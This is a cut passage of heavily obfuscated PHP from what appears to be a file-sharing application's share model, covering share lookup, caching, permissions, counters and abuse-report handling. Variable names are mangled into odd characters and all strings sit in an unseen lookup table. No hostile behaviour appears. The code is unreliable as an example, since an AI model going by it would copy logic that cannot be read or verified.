if (!$“ ¶–Ä¶) { $“ ¶–Ä¶ = $¢šÕ Í[2137] . USER_ID; } if ($®·ƒûİ) { return $this->_getShareInfo(array($¢šÕ Í[672] => $‘ùÚ¹°¼)); } $¿Á±à± = $this->cacheFunctionGet($¢šÕ Í[2079], $‘ùÚ¹°¼, $“ ¶–Ä¶); $ïÓßŞ±¡ = $this->shareInfoMofify($¿Á±à±, $¢šÕ Í[226]); if (isset($¿Á±à±[$¢šÕ Í[88]]) && $ïÓßŞ±¡ != $¿Á±à±[$¢šÕ Í[88]]) { $Í‹ƒ›Â„ = $this->cacheKeyMake($¢šÕ Í[2079], $‘ùÚ¹°¼, $“ ¶–Ä¶); $¿Á±à± = $this->_getShareInfo(array($¢šÕ Í[672] => $‘ùÚ¹°¼)); Cache::set($Í‹ƒ›Â„, $¿Á±à±); } return $¿Á±à±; } private function shareInfoMofify(&$‘äºÙ”, $¡¥¤Æªã = "\147\x65\164") { $¥¥ õšğ =& $_SERVER[ıÚ˜š²İ]; if (!$‘äºÙ” || !isset($‘äºÙ”[$¥¥ õšğ[672]])) { return; } $›©¼™Ïü = $¥¥ õšğ[2141] . $‘äºÙ”[$¥¥ õšğ[672]]; if ($¡¥¤Æªã == $¥¥ õšğ[226]) { return Cache::get($›©¼™Ïü); } else { if ($¡¥¤Æªã == $¥¥ õšğ[2108]) { $˜¼†ßê = Cache::get($›©¼™Ïü); if ($˜¼†ßê === $‘äºÙ”[$¥¥ õšğ[88]]) { return; } $‘äºÙ”[$¥¥ õšğ[2142]] = USER_ID . $¥¥ õšğ[464] . $‘äºÙ”[$¥¥ õšğ[88]]; Cache::set($›©¼™Ïü, $‘äºÙ”[$¥¥ õšğ[88]]); } else { if ($¡¥¤Æªã == $¥¥ õšğ[2143]) { Cache::remove($›©¼™Ïü); } } } } public function getInfoByHash($ïßÍ‘±ó) { return $this->_getShareInfo(array($_SERVER[ıÚ˜š²İ][2144] => $ïßÍ‘±ó)); } public function getInfoByPath($³­ƒäêí) { $ôÌ·§¾ =& $_SERVER[ıÚ˜š²İ]; $‰åœ“º = array($ôÌ·§¾[1792] => USER_ID, $ôÌ·§¾[194] => $³­ƒäêí); return $this->_getShareInfo($‰åœ“º); } public function getInfoBySourcePath($·ÏÛº¥—) { $Á²íº õ =& $_SERVER[ıÚ˜š²İ]; $Ì•ª£¸š = array($Á²íº õ[1792] => USER_ID, $Á²íº õ[1271] => $·ÏÛº¥—); return $this->_getShareInfo($Ì•ª£¸š); } private function _getShareInfo($åü±ã«) { $û¶ŸÈšò =& $_SERVER[ıÚ˜š²İ]; $³«Í˜Ù = $this->where($åü±ã«)->find(); if (!$³«Í˜Ù) { return !1; } $åü±ã« = array($û¶ŸÈšò[672] => $³«Í˜Ù[$û¶ŸÈšò[672]]); $¤¾ÂâÑÏ = $û¶ŸÈšò[2145]; $ëô¼¨ = Model($û¶ŸÈšò[673])->order($û¶ŸÈšò[477])->field($¤¾ÂâÑÏ)->where($åü±ã«)->select(); if ($³«Í˜Ù[$û¶ŸÈšò[194]] == $û¶ŸÈšò[231]) { $³«Í˜Ù[$û¶ŸÈšò[90]] = IO::info($³«Í˜Ù[$û¶ŸÈšò[1271]]); } else { $³«Í˜Ù[$û¶ŸÈšò[90]] = Model($û¶ŸÈšò[1442])->pathInfo($³«Í˜Ù[$û¶ŸÈšò[194]]); } $³«Í˜Ù[$û¶ŸÈšò[2146]] = $ëô¼¨; $this->shareInfoMofify($³«Í˜Ù, $û¶ŸÈšò[2108]); return $³«Í˜Ù; } protected function getInfoAuth($µÊ¬ô›€) { $¿‡—ğáµ =& $_SERVER[ıÚ˜š²İ]; $ÊäÄ÷ë© = $this->getInfo($µÊ¬ô›€); if ($ÊäÄ÷ë©[$¿‡—ğáµ[1792]] == USER_ID) { $ÊäÄ÷ë©[$¿‡—ğáµ[489]] = $ÊäÄ÷ë©[$¿‡—ğáµ[90]][$¿‡—ğáµ[489]]; } else { $ÊäÄ÷ë©[$¿‡—ğáµ[489]] = Model($¿‡—ğáµ[571])->authMake($ÊäÄ÷ë©[$¿‡—ğáµ[2146]]); } return $ÊäÄ÷ë©; } protected function listData($÷õ¯ÊÉå = null, $Èå‚ı¹ = 300) { $¶Ÿİ‘« =& $_SERVER[ıÚ˜š²İ]; $Ÿ³Í¡— = array(array($¶Ÿİ‘«[566] => array($¶Ÿİ‘«[1101], 0), $¶Ÿİ‘«[670] => array($¶Ÿİ‘«[1101], 0), $¶Ÿİ‘«[2147] => $¶Ÿİ‘«[2096])); if ($÷õ¯ÊÉå == $¶Ÿİ‘«[2148]) { $Ÿ³Í¡— = array($¶Ÿİ‘«[566] => 1); } else { if ($÷õ¯ÊÉå == $¶Ÿİ‘«[1254]) { $Ÿ³Í¡— = array($¶Ÿİ‘«[670] => 1); } } $Ÿ³Í¡—[$¶Ÿİ‘«[1792]] = USER_ID; $Š÷Ø×½— = $this->where($Ÿ³Í¡—)->selectPage($Èå‚ı¹); return $Š÷Ø×½—; } protected function listToMe($‹»Û¨Œ¨ = 300) { $¯¤ıûœ‹ =& $_SERVER[ıÚ˜š²İ]; $í®ĞÎ¦İ = Model($¯¤ıûœ‹[2149])->userGroupParents(USER_ID); $Á£Ÿ°Ö¯ = array($¯¤ıûœ‹[655] => SourceModel::TYPE_USER, $¯¤ıûœ‹[573] => USER_ID); if ($í®ĞÎ¦İ) { $Á£Ÿ°Ö¯ = array(array($¯¤ıûœ‹[655] => SourceModel::TYPE_USER, $¯¤ıûœ‹[573] => USER_ID), array($¯¤ıûœ‹[655] => SourceModel::TYPE_GROUP, $¯¤ıûœ‹[573] => array($¯¤ıûœ‹[7], $í®ĞÎ¦İ)), $¯¤ıûœ‹[2147] => $¯¤ıûœ‹[2096]); } $ıºÈÚ‚… = Model($¯¤ıûœ‹[673])->where($Á£Ÿ°Ö¯)->selectPage($‹»Û¨Œ¨); $ìşÓ¥ÙŞ = array_to_keyvalue_group($ıºÈÚ‚…[$¯¤ıûœ‹[447]], $¯¤ıûœ‹[672]); if (!$ìşÓ¥ÙŞ) { return $ıºÈÚ‚…; } $á‡œÛÛ¢ = $¯¤ıûœ‹[2150]; $Á£Ÿ°Ö¯ = array($¯¤ıûœ‹[672] => array($¯¤ıûœ‹[494], array_keys($ìşÓ¥ÙŞ)), $¯¤ıûœ‹[1792] => array($¯¤ıûœ‹[1103], $¯¤ıûœ‹[231])); $û¿ôÜä» = $this->field($á‡œÛÛ¢)->where($Á£Ÿ°Ö¯)->select(); foreach ($û¿ôÜä» as $ÜÃÒëÅ => &$¶Â›é) { $¶Â›é[$¯¤ıûœ‹[2146]] = $ìşÓ¥ÙŞ[$¶Â›é[$¯¤ıûœ‹[672]]]; } unset($¶Â›é); $¿¿®«‡ = array($¯¤ıûœ‹[2151] => $û¿ôÜä», $¯¤ıûœ‹[2152] => $ıºÈÚ‚…[$¯¤ıûœ‹[444]]); return $¿¿®«‡; } protected function shareAdd($üÜÜ€ó¢, $ıºñ¯ı‰) { $Ù†Ä¡‹€ =& $_SERVER[ıÚ˜š²İ]; $êªù‡Ğ÷ = $this->_addShareData($üÜÜ€ó¢, $ıºñ¯ı‰); if (!empty($ıºñ¯ı‰[$Ù†Ä¡‹€[2153]])) { $this->_shareAuthSet($êªù‡Ğ÷, $ıºñ¯ı‰[$Ù†Ä¡‹€[2153]]); } $this->shareEventAdd($üÜÜ€ó¢, $ıºñ¯ı‰, $Ù†Ä¡‹€[2154]); return $êªù‡Ğ÷; } protected function shareAddSystem($™ü§¥å, $ºäÀÚ¾§) { $äš‰Ä =& $_SERVER[ıÚ˜š²İ]; $†Óõ§¦ = $this->_addShareData($™ü§¥å, $ºäÀÚ¾§, $äš‰Ä[192]); $this->_shareAuthSet($†Óõ§¦, $ºäÀÚ¾§[$äš‰Ä[2153]]); return $†Óõ§¦; } private function shareEventAdd($¡Ş·Ş¿“, $»Š¦ÏÛô, $…–å€ = "\141\144\144") { $¡²ô–È =& $_SERVER[ıÚ˜š²İ]; if (!$¡Ş·Ş¿“ || $¡Ş·Ş¿“ == $¡²ô–È[231]) { return; } if ($…–å€ == $¡²ô–È[2154]) { if ($»Š¦ÏÛô[$¡²ô–È[566]] == $¡²ô–È[91]) { Model($¡²ô–È[640])->eventShare($¡Ş·Ş¿“, $¡²ô–È[2155]); } if ($»Š¦ÏÛô[$¡²ô–È[670]] == $¡²ô–È[91]) { Model($¡²ô–È[640])->eventShare($¡Ş·Ş¿“, $¡²ô–È[2156]); } return; } $éÌñ—öÁ = $this->getInfoByPath($¡Ş·Ş¿“); $ğ‚£°  = $¡²ô–È[2157]; if ($éÌñ—öÁ[$¡²ô–È[566]] == $¡²ô–È[231] && $»Š¦ÏÛô[$¡²ô–È[566]] == $¡²ô–È[91]) { $ğ‚£°  = $¡²ô–È[2155]; } if ($éÌñ—öÁ[$¡²ô–È[566]] == $¡²ô–È[91] && $»Š¦ÏÛô[$¡²ô–È[566]] == $¡²ô–È[231]) { $ğ‚£°  = $¡²ô–È[2158]; } if ($éÌñ—öÁ[$¡²ô–È[670]] == $¡²ô–È[231] && $»Š¦ÏÛô[$¡²ô–È[670]] == $¡²ô–È[91]) { $ğ‚£°  = $¡²ô–È[2156]; } if ($éÌñ—öÁ[$¡²ô–È[670]] == $¡²ô–È[91] && $»Š¦ÏÛô[$¡²ô–È[670]] == $¡²ô–È[231]) { $ğ‚£°  = $¡²ô–È[2159]; } Model($¡²ô–È[640])->eventShare($¡Ş·Ş¿“, $ğ‚£° ); return; } private function _addShareData($È«¯¡ş’, $¶şü·º = array(), $¾¦íª­ = false) { $˜Öê”²“ =& $_SERVER[ıÚ˜š²İ]; $½ïàà = $¾¦íª­ == $˜Öê”²“[192] ? 0 : USER_ID; $¡¹°ÃØ = array($˜Öê”²“[493] => $È«¯¡ş’, $˜Öê”²“[1783] => $½ïàà); if ($È«¯¡ş’ == 0) { $¡¹°ÃØ = array($˜Öê”²“[2160] => $¶şü·º[$˜Öê”²“[1271]], $˜Öê”²“[1783] => $½ïàà); } if ($«ç«›ˆ = $this->where($¡¹°ÃØ)->find()) { return $«ç«›ˆ[$˜Öê”²“[672]]; } if ($È«¯¡ş’ == 0) { $Ÿç‹Ò‘ã = array($˜Öê”²“[32] => get_path_this($¶şü·º[$˜Öê”²“[87]])); } else { $Ÿç‹Ò‘ã = Model($˜Öê”²“[907])->sourceInfo($È«¯¡ş’); if (!$Ÿç‹Ò‘ã) { return !1; } } if (!$¶şü·º[$˜Öê”²“[1680]]) { $¶şü·º[$˜Öê”²“[1680]] = $Ÿç‹Ò‘ã[$˜Öê”²“[32]]; } $‚¬Ñôì¸ = array($˜Öê”²“[1783] => $½ïàà, $˜Öê”²“[493] => $È«¯¡ş’, $˜Öê”²“[1680] => $˜Öê”²“[12], $˜Öê”²“[566] => 0, $˜Öê”²“[670] => 0, $˜Öê”²“[1271] => $˜Öê”²“[12], $˜Öê”²“[384] => $˜Öê”²“[12], $˜Öê”²“[978] => $˜Öê”²“[12], $˜Öê”²“[2161] => 0, $˜Öê”²“[2162] => 0, $˜Öê”²“[838] => 0, $˜Öê”²“[2163] => $˜Öê”²“[12], $˜Öê”²“[2144] => $˜Öê”²“[12]); $ÃÇÄåØ€ = explode($˜Öê”²“[50], $˜Öê”²“[2164]); foreach ($ÃÇÄåØ€ as $‘üäÅçŞ) { if (!isset($¶şü·º[$‘üäÅçŞ])) { continue; } $‚¬Ñôì¸[$‘üäÅçŞ] = $¶şü·º[$‘üäÅçŞ]; } $àúá©» = $this->add($‚¬Ñôì¸); $šáòÇğØ = array($˜Öê”²“[2144] => short_id($àúá©»)); $this->where(array($˜Öê”²“[2165] => $àúá©»))->save($šáòÇğØ); return $àúá©»; } private function _shareAuthSet($Ö¦ú½Á, $Şê¡İ¼ü) { $ªÌãôÉ =& $_SERVER[ıÚ˜š²İ]; if (!is_array($Şê¡İ¼ü)) { return !1; } $šÌÀîÄ = Model($ªÌãôÉ[2106]); $šÌÀîÄ->where(array($ªÌãôÉ[672] => $Ö¦ú½Á))->delete(); $ñÛ­½š = array(); foreach ($Şê¡İ¼ü as $ó”Ø¥º”) { $‰ğıôÓ = SourceModel::TYPE_USER; if ($ó”Ø¥º”[$ªÌãôÉ[191]] == SourceModel::TYPE_GROUP) { $‰ğıôÓ = SourceModel::TYPE_GROUP; } $æ¦¦ø×ü = array($ªÌãôÉ[672] => $Ö¦ú½Á, $ªÌãôÉ[191] => $‰ğıôÓ, $ªÌãôÉ[573] => intval($ó”Ø¥º”[$ªÌãôÉ[573]]), $ªÌãôÉ[2102] => 0, $ªÌãôÉ[2166] => -1); if ($ó”Ø¥º”[$ªÌãôÉ[2102]]) { $æ¦¦ø×ü[$ªÌãôÉ[2102]] = $ó”Ø¥º”[$ªÌãôÉ[2102]]; } else { if ($ó”Ø¥º”[$ªÌãôÉ[2166]]) { $æ¦¦ø×ü[$ªÌãôÉ[2166]] = $ó”Ø¥º”[$ªÌãôÉ[2166]]; } } $ñÛ­½š[] = $æ¦¦ø×ü; } return $šÌÀîÄ->addAll($ñÛ­½š, array(), !0); } public function numViewAdd($¤ëâ©ü ) { $ß¿©—…¨ =& $_SERVER[ıÚ˜š²İ]; $Œ”ÊÁ = array($ß¿©—…¨[2165] => $¤ëâ©ü ); $this->where($Œ”ÊÁ)->setAdd($ß¿©—…¨[2161]); } public function numDownloadAdd($î‰½« î) { $ÕåêŠÀú =& $_SERVER[ıÚ˜š²İ]; $îßæ‡¡Ş = array($ÕåêŠÀú[2165] => $î‰½« î); $this->where($îßæ‡¡Ş)->setAdd($ÕåêŠÀú[2162]); } protected function shareEdit($¢¾£˜€, $Ø´¿øã) { $¦†¾¨¡ =& $_SERVER[ıÚ˜š²İ]; $ë—íôœ = $this->getInfo($¢¾£˜€); if (!$ë—íôœ) { return !1; } $this->_checkLinkShare($Ø´¿øã, $ë—íôœ); $Üáô­ä = array(); $Ü‚²Ë’× = explode($¦†¾¨¡[50], $¦†¾¨¡[2167]); foreach ($Ü‚²Ë’× as $ó¡ºúÜÑ) { if (!array_key_exists($ó¡ºúÜÑ, $Ø´¿øã)) { continue; } $Üáô­ä[$ó¡ºúÜÑ] = $Ø´¿øã[$ó¡ºúÜÑ]; } $this->shareEventAdd($ë—íôœ[$¦†¾¨¡[194]], $Ø´¿øã, $¦†¾¨¡[1963]); $this->where(array($¦†¾¨¡[2165] => $¢¾£˜€))->save($Üáô­ä); if (isset($Ø´¿øã[$¦†¾¨¡[2153]])) { $this->_shareAuthSet($¢¾£˜€, $Ø´¿øã[$¦†¾¨¡[2153]]); } return !0; } private function _checkLinkShare($•Ùø•íÙ, $³ÕÎ«¯Ş) { $İôÏºú =& $_SERVER[ıÚ˜š²İ]; if ($•Ùø•íÙ[$İôÏºú[566]] != $İôÏºú[91]) { return; } $»Éø±Ó† = $³ÕÎ«¯Ş[$İôÏºú[90]][$İôÏºú[194]]; if ($³ÕÎ«¯Ş[$İôÏºú[90]][$İôÏºú[33]] != $İôÏºú[233]) { $˜˜˜§ğ = $this->_folderReport($»Éø±Ó†); if (!$˜˜˜§ğ) { return; } show_json(LNG($İôÏºú[2168]) . $İôÏºú[2169] . $˜˜˜§ğ, !1); } $»œÜÉå = Model($İôÏºú[907])->fileInfoGet($³ÕÎ«¯Ş[$İôÏºú[90]][$İôÏºú[194]]); if (!$»œÜÉå) { return; } $ºÜµ¥‰ = $this->shareFileMeta($»œÜÉå[$İôÏºú[545]]); if (isset($ºÜµ¥‰[$İôÏºú[452]]) && $ºÜµ¥‰[$İôÏºú[452]] == $İôÏºú[91]) { show_json(LNG($İôÏºú[2170]), !1); } } private function _folderReport($²ÀüÜËì) { $ôİÄ¥¨« =& $_SERVER[ıÚ˜š²İ]; $È×ş ù = array($ôİÄ¥¨«[545] => array($ôİÄ¥¨«[1101], 0), $ôİÄ¥¨«[826] => 3); $¼êãÜîê = Model($ôİÄ¥¨«[2171])->where($È×ş ù)->field($ôİÄ¥¨«[545])->select(); if (!$¼êãÜîê) { return !1; } $¼êãÜîê = array_to_keyvalue($¼êãÜîê, $ôİÄ¥¨«[12], $ôİÄ¥¨«[545]); $åœëÆ = $ôİÄ¥¨«[50] . $²ÀüÜËì . $ôİÄ¥¨«[50]; $È×ş ù = array($ôİÄ¥¨«[545] => array($ôİÄ¥¨«[7], $¼êãÜîê), $ôİÄ¥¨«[588] => array($ôİÄ¥¨«[461], "\x25{$åœëÆ}\45"), $ôİÄ¥¨«[507] => 0); $©‡†©•³ = Model($ôİÄ¥¨«[907])->where($È×ş ù)->field($ôİÄ¥¨«[2172])->find(); if (!$©‡†©•³) { return !1; } $Öòï³¼ = substr($©‡†©•³[$ôİÄ¥¨«[588]], strpos($©‡†©•³[$ôİÄ¥¨«[588]], $åœëÆ)); $È×ş ù = array($ôİÄ¥¨«[194] => array($ôİÄ¥¨«[7], trim($Öòï³¼, $ôİÄ¥¨«[50]))); $“¸ù‘İ¤ = Model($ôİÄ¥¨«[907])->where($È×ş ù)->field($ôİÄ¥¨«[32])->select(); $ò©ğÛìØ = array_to_keyvalue($“¸ù‘İ¤, $ôİÄ¥¨«[12], $ôİÄ¥¨«[32]); $ò©ğÛìØ[] = $©‡†©•³[$ôİÄ¥¨«[32]]; return implode($ôİÄ¥¨«[8], $ò©ğÛìØ); } protected function remove($öÃõ¡üƒ) { $ğª‰š£  =& $_SERVER[ıÚ˜š²İ]; $·êü¯Æ = is_array($öÃõ¡üƒ) ? $öÃõ¡üƒ : array($öÃõ¡üƒ); for ($ô½õš× = 0; $ô½õš× < count($·êü¯Æ); $ô½õš×++) { $¬Ñ‰‹’‚ = $this->getInfo($·êü¯Æ[$ô½õš×]); if ($¬Ñ‰‹’‚[$ğª‰š£ [670]] == $ğª‰š£ [91]) { Model($ğª‰š£ [640])->eventShare($¬Ñ‰‹’‚[$ğª‰š£ [194]], $ğª‰š£ [2159]); } if ($¬Ñ‰‹’‚[$ğª‰š£ [566]] == $ğª‰š£ [91]) { Model($ğª‰š£ [640])->eventShare($¬Ñ‰‹’‚[$ğª‰š£ [194]], $ğª‰š£ [2158]); } $this->shareInfoMofify($¬Ñ‰‹’‚, $ğª‰š£ [2143]); } $´§€‹òí = array($ğª‰š£ [672] => array($ğª‰š£ [7], $·êü¯Æ)); $Ã†õ»ı‹ = $this->where($´§€‹òí)->delete(); if ($Ã†õ»ı‹) { Model($ğª‰š£ [673])->where($´§€‹òí)->delete(); } return $Ã†õ»ı‹; } protected function removeBySource($ñ“”éÖ˜) { $îäÒŠß£ =& $_SERVER[ıÚ˜š²İ]; $¡úÃÂ¾µ = array($îäÒŠß£[493] => array($îäÒŠß£[494], $ñ“”éÖ˜)); $òõï­àÇ = $this->field($îäÒŠß£[672])->where($¡úÃÂ¾µ)->select(); $¯•™œâÛ = array_to_keyvalue($òõï­àÇ, $îäÒŠß£[12], $îäÒŠß£[672]); if (!$¯•™œâÛ) { return; } foreach ($òõï­àÇ as $åø¼¸) { $this->shareInfoMofify($åø¼¸, $îäÒŠß£[2143]); } $¡úÃÂ¾µ = array($îäÒŠß£[2165] => array($îäÒŠß£[494], $¯•™œâÛ)); $this->where($¡úÃÂ¾µ)->delete(); Model($îäÒŠß£[673])->where($¡úÃÂ¾µ)->delete(); } public function listAll($µşşÄ×Ø) { $ë¤üâîˆ =& $_SERVER[ıÚ˜š²İ]; $ïë¸ÔÆ = array(); if ($µşşÄ×Ø[$ë¤üâîˆ[1792]]) { $ïë¸ÔÆ[$ë¤üâîˆ[1792]] = $µşşÄ×Ø[$ë¤üâîˆ[1792]]; } if ($µşşÄ×Ø[$ë¤üâîˆ[837]]) { $ÆÀÚÚ™ã = $µşşÄ×Ø[$ë¤üâîˆ[838]] ? $µşşÄ×Ø[$ë¤üâîˆ[838]] : strtotime(date($ë¤üâîˆ[2173])); $ïë¸ÔÆ[$ë¤üâîˆ[234]] = array($ë¤üâîˆ[410], array($µşşÄ×Ø[$ë¤üâîˆ[837]], $ÆÀÚÚ™ã)); } if ($µşşÄ×Ø[$ë¤üâîˆ[33]]) { $ïë¸ÔÆ[$µşşÄ×Ø[$ë¤üâîˆ[33]]] = 1; } else { $ïë¸ÔÆ[] = array($ë¤üâîˆ[566] => array($ë¤üâîˆ[1101], 0), $ë¤üâîˆ[670] => array($ë¤üâîˆ[1101], 0), $ë¤üâîˆ[2147] => $ë¤üâîˆ[2096]); } if ($µşşÄ×Ø[$ë¤üâîˆ[2092]]) { $ïë¸ÔÆ[] = array($ë¤üâîˆ[2144] => $µşşÄ×Ø[$ë¤üâîˆ[2092]], $ë¤üâîˆ[1680] => array($ë¤üâîˆ[461], "\45{$µşşÄ×Ø[$ë¤üâîˆ[2092]]}\45"), $ë¤üâîˆ[2147] => $ë¤üâîˆ[2096]); } $Ä·’ëÖ = $this->_makeOrder()->where($ïë¸ÔÆ)->selectPage(20); if (empty($Ä·’ëÖ[$ë¤üâîˆ[447]])) { return array(); } $this->_listDataApply($Ä·’ëÖ[$ë¤üâîˆ[447]]); return $Ä·’ëÖ; } public function listDataApply($¨²‡ÅÛÅ) { $this->_listDataApply($¨²‡ÅÛÅ); return $¨²‡ÅÛÅ; } private function _listDataApply(&$…¿‚Ş²İ) { $¦¬è·±¦ =& $_SERVER[ıÚ˜š²İ]; $‘ÖèË¿¥ = array_to_keyvalue($…¿‚Ş²İ, $¦¬è·±¦[12], $¦¬è·±¦[1792]); $ğ•§¤Œ = Model($¦¬è·±¦[601])->userListInfo(array_unique($‘ÖèË¿¥)); $ˆØíØø = array_to_keyvalue($…¿‚Ş²İ, $¦¬è·±¦[12], $¦¬è·±¦[194]); $”…´çàÇ = Model($¦¬è·±¦[907])->sourceListInfo($ˆØíØø, !0); foreach ($…¿‚Ş²İ as $¾™ç³· => &$‘ú¹’Å) { $ø©¡œƒ“ = $‘ú¹’Å[$¦¬è·±¦[1792]]; $‘ú¹’Å[$¦¬è·±¦[2174]] = $ğ•§¤Œ[$ø©¡œƒ“] ? $ğ•§¤Œ[$ø©¡œƒ“] : !1; if (!$‘ú¹’Å[$¦¬è·±¦[2174]] || $‘ú¹’Å[$¦¬è·±¦[2174]][$¦¬è·±¦[826]] != $¦¬è·±¦[91]) { unset($…¿‚Ş²İ[$¾™ç³·]); continue; } $„â££Ïñ = $‘ú¹’Å[$¦¬è·±¦[194]]; $‘ú¹’Å[$¦¬è·±¦[90]] = $”…´çàÇ[$„â££Ïñ] ? $”…´çàÇ[$„â££Ïñ] : !1; if ($‘ú¹’Å[$¦¬è·±¦[90]][$¦¬è·±¦[507]] == $¦¬è·±¦[91]) { unset($…¿‚Ş²İ[$¾™ç³·]); } if ($‘ú¹’Å[$¦¬è·±¦[90]] != $¦¬è·±¦[231] && !$‘ú¹’Å[$¦¬è·±¦[90]]) { unset($…¿‚Ş²İ[$¾™ç³·]); } } unset($‘ú¹’Å); $…¿‚Ş²İ = array_values($…¿‚Ş²İ); } private function _makeOrder($şùŒ—Ä = '') { $Øª¼®»æ =& $_SERVER[ıÚ˜š²İ]; $÷è¹†ì = array($Øª¼®»æ[234], $Øª¼®»æ[838], $Øª¼®»æ[2161], $Øª¼®»æ[2162]); $¢ûç“â„ = array($Øª¼®»æ[525] => $Øª¼®»æ[526], $Øª¼®»æ[527] => $Øª¼®»æ[528]); $õØŸ—‰ø = Input::get($Øª¼®»æ[532], $Øª¼®»æ[7], $Øª¼®»æ[499], $÷è¹†ì); $µ‹–ÔšË = Input::get($Øª¼®»æ[533], $Øª¼®»æ[7], $Øª¼®»æ[2175], array($Øª¼®»æ[2089], $Øª¼®»æ[527])); $µ‹–ÔšË = $¢ûç“â„[$µ‹–ÔšË]; $şùŒ—Ä = $şùŒ—Ä . "{$õØŸ—‰ø}\40{$µ‹–ÔšË}"; return $this->order($şùŒ—Ä); } public function reportAdd($•øíá³‰) { $öÈŒü”ä =& $_SERVER[ıÚ˜š²İ]; $ÄŸË—¦ö = array($öÈŒü”ä[672] => $•øíá³‰[$öÈŒü”ä[672]], $öÈŒü”ä[1792] => USER_ID); if (Model($öÈŒü”ä[2171])->where($ÄŸË—¦ö)->find()) { return !1; } $‘ËëŸô‡ = array($öÈŒü”ä[672] => $•øíá³‰[$öÈŒü”ä[672]], $öÈŒü”ä[1680] => $•øíá³‰[$öÈŒü”ä[1680]], $öÈŒü”ä[194] => $•øíá³‰[$öÈŒü”ä[194]], $öÈŒü”ä[545] => $•øíá³‰[$öÈŒü”ä[545]], $öÈŒü”ä[1792] => USER_ID, $öÈŒü”ä[33] => $•øíá³‰[$öÈŒü”ä[33]], $öÈŒü”ä[528] => $•øíá³‰[$öÈŒü”ä[528]]); return Model($öÈŒü”ä[2171])->add($‘ËëŸô‡); } public function reportList($ò‰ç“ìç) { $òå²Øèİ =& $_SERVER[ıÚ˜š²İ]; $Îë¢Œ¼¸ = array(); if ($ò‰ç“ìç[$òå²Øèİ[837]]) { $­›’®Òã = $ò‰ç“ìç[$òå²Øèİ[838]] ? $ò‰ç“ìç[$òå²Øèİ[838]] : strtotime(date($òå²Øèİ[2173])); $Îë¢Œ¼¸[$òå²Øèİ[234]] = array($òå²Øèİ[410], array($ò‰ç“ìç[$òå²Øèİ[837]], $­›’®Òã)); } if (isset($ò‰ç“ìç[$òå²Øèİ[33]]) && in_array($ò‰ç“ìç[$òå²Øèİ[33]], array($òå²Øèİ[91], $òå²Øèİ[512], $òå²Øèİ[2176], $òå²Øèİ[2177], $òå²Øèİ[2178]))) { $Îë¢Œ¼¸[$òå²Øèİ[33]] = $ò‰ç“ìç[$òå²Øèİ[33]]; } if (isset($ò‰ç“ìç[$òå²Øèİ[826]]) && in_array($ò‰ç“ìç[$òå²Øèİ[826]], array($òå²Øèİ[231], $òå²Øèİ[91], $òå²Øèİ[512], $òå²Øèİ[2176]))) { $Îë¢Œ¼¸[$òå²Øèİ[826]] = $ò‰ç“ìç[$òå²Øèİ[826]]; } $æŒìª = Input::get($òå²Øèİ[533], $òå²Øèİ[7], $òå²Øèİ[2175], array($òå²Øèİ[2089], $òå²Øèİ[527])); $ŒŠ¥Ô™ö = array($òå²Øèİ[525] => $òå²Øèİ[526], $òå²Øèİ[527] => $òå²Øèİ[528]); $á•ûÀæ‰ = $òå²Øèİ[2179] . $ŒŠ¥Ô™ö[$æŒìª]; $ÙÈ¶œí = Model($òå²Øèİ[2171])->where($Îë¢Œ¼¸)->order($á•ûÀæ‰)->selectPage(20); if (empty($ÙÈ¶œí[$òå²Øèİ[447]])) { return array(); } $¨³œØú’ = array_to_keyvalue_group($ÙÈ¶œí[$òå²Øèİ[447]], $òå²Øèİ[826], $òå²Øèİ[672]); if (!empty($¨³œØú’[0])) { $ò‰ç“ìç = $¨³œØú’[0]; $Îë¢Œ¼¸ = array($òå²Øèİ[672] => array($òå²Øèİ[7], $ò‰ç“ìç)); $éÆËÙóË = $this->where($Îë¢Œ¼¸)->field($òå²Øèİ[672])->select(); $éÆËÙóË = array_to_keyvalue($éÆËÙóË, $òå²Øèİ[12], $òå²Øèİ[672]); $Ä×ÇĞáÉ = array_diff($ò‰ç“ìç, $éÆËÙóË); if (!empty($Ä×ÇĞáÉ)) { foreach ($ÙÈ¶œí[$òå²Øèİ[447]] as $ñÀŸÇÖ => $”à¼ªøÁ) { if (in_array($”à¼ªøÁ[$òå²Øèİ[672]], $Ä×ÇĞáÉ)) { unset($ÙÈ¶œí[$òå²Øèİ[447]][$ñÀŸÇÖ]); } } } } $this->_listDataApply($ÙÈ¶œí[$òå²Øèİ[447]]); return $ÙÈ¶œí; } public function reportStatus($ı‹±ĞÙÌ) { $‹˜èà²ê =& $_SERVER[ıÚ˜š²İ]; $²Éè¶ûŞ = array($‹˜èà²ê[477] => $ı‹±ĞÙÌ[$‹˜èà²ê[477]]); $ÙĞòô†… = Model($‹˜èà²ê[2171])->where($²Éè¶ûŞ)->field($‹˜èà²ê[2180])->find(); if (!$ÙĞòô†…) { return !1; } $ŠËÒ°ÍÂ = array($‹˜èà²ê[826] => $ı‹±ĞÙÌ[$‹˜èà²ê[826]]); if ($ı‹±ĞÙÌ[$‹˜èà²ê[826]] == $‹˜èà²ê[2176] && $ÙĞòô†…[$‹˜èà²ê[826]] == $‹˜èà²ê[2176]) { $ŠËÒ°ÍÂ[$‹˜èà²ê[826]] = 0; } $ŞÅ İ±° = Model($‹˜èà²ê[2171])->where($²Éè¶ûŞ)->save($ŠËÒ°ÍÂ); if ($ı‹±ĞÙÌ[$‹˜èà²ê[826]] == $‹˜èà²ê[512]) { if ($ÙĞòô†…[$‹˜èà²ê[545]] != $‹˜èà²ê[231] && $this->shareFileMeta($ÙĞòô†…[$‹˜èà²ê[545]])) { $this->shareFileMeta($ÙĞòô†…[$‹˜èà²ê[545]], 0); } $this->remove($ÙĞòô†…[$‹˜èà²ê[672]]); return !0; } if ($ŞÅ İ±° && $ı‹±ĞÙÌ[$‹˜èà²ê[826]] == $‹˜èà²ê[2176]) { $€Ş£Öß‰ = $ŠËÒ°ÍÂ[$‹˜èà²ê[826]] == $‹˜èà²ê[2176] ? 1 : 0; $this->shareFileMeta($ÙĞòô†…[$‹˜èà²ê[545]], $€Ş£Öß‰); $this->removeByFile($ÙĞòô†…[$‹˜èà²ê[545]]); } return $ŞÅ İ±°; } private function removeByFile($½Ÿç‘É¯) { $§¨‹ÍÚá =& $_SERVER[ıÚ˜š²İ]; $¹çÜãÜ = Model($§¨‹ÍÚá[907])->where(array($§¨‹ÍÚá[545] => $½Ÿç‘É¯))->field($§¨‹ÍÚá[194])->select(); $Îî«ó²ğ = array_to_keyvalue($¹çÜãÜ, $§¨‹ÍÚá[12], $§¨‹ÍÚá[194]); $Ô›Ã›²ë = array($§¨‹ÍÚá[194] => array($§¨‹ÍÚá[7], $Îî«ó²ğ), 